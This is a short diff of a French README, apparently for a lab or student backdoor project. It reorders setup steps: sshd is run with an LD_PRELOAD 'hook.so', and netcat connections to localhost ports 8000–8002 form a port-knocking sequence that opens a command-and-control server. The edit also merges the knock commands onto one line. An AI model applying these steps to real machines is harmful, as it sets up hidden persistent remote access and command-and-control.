@@ -61,20 +61,17 @@ sudo LD_PRELOAD=$(pwd)/hook.so /usr/sbin/sshd -D
 ssh -i private_key.pem testuser@localhost
 ```
 
-### **4. Port Knocking pour ouvrir le serveur C2**
-
-Dans un terminal, exécuter la séquence de knocking :
-
+### **4. lancement du Port Knocking 
 ```bash
-nc 127.0.0.1 8000         
-nc 127.0.0.1 8001
-nc 127.0.0.1 8002
-```
-### **5. lancement du Port Knocking  
+ ./port_knocking
+ ```   
 
+### **5. Port Knocking pour ouvrir le serveur C2** Dans un terminal, 
+
+exécuter la séquence de knocking : 
 ```bash
-./port_knocking
-```
+ nc 127.0.0.1 8000 nc 127.0.0.1 8001 nc 127.0.0.1 8002
+ ```
 
 ### **5. Démarrage automatique du serveur C2**
 
